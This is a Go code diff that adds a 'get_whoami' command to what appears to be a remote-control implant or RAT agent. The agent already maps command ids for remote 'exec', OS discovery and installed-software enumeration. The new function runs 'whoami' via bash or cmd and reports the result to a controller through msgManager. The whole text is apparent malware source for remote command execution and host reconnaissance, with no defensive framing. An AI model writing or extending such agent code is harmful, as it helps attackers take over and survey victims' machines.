@@ -112,11 +112,12 @@ func translateCodesList(c string) string {
 	codes_list := map[string]string{
 		"exec":"1",
 		"1":"exec",
-		"__comment__get_os":"cid=2, does not have second part (for request)",
 		"get_os":"2",
 		"2":"get_os",
 		"get_software":"3",
 		"3":"get_software",
+		"4":"get_whoami",
+		"get_whoami":"4",
 	}
 
 	translated := codes_list[c]
@@ -132,6 +133,8 @@ func interpretCodes(code string, msg string){
 		sendOsInfo()
 	} else if code == "get_software" {
 		sendSoftware()
+	} else if code == "get_whoami"{
+		sendWhoamiOutput()
 	}
 
 }
@@ -234,5 +237,34 @@ func sendOsInfo(){
 	var os_name = os_info.GoOS + " " + os_info.Core
 	var prefix = "cid=" + translateCodesList("get_os") + ","
 	msgManager(prefix + os_name)
+
+}
+
+func sendWhoamiOutput(){
+
+	var prefix = "cid=" + translateCodesList("get_whoami") + "," // prefix for answer
+	os_info := goInfo.GetInfo()
+
+	var executable_name string
+	var command_arg string
+
+	if os_info.GoOS == "linux" {
+		executable_name = "bash"
+		command_arg = "-c"
+	} else if os_info.GoOS == "windows" {
+		executable_name = "cmd"
+		command_arg = "/c"
+	} else {
+		msgManager(prefix + "OS Not Detected")
+		return
+	}
+
+	out, err := exec.Command(executable_name, command_arg, "whoami").Output()
+
+	if err != nil {
+		msgManager(prefix + err.Error())
+	} else {
+		msgManager(prefix + string(out))
+	}
 
 }
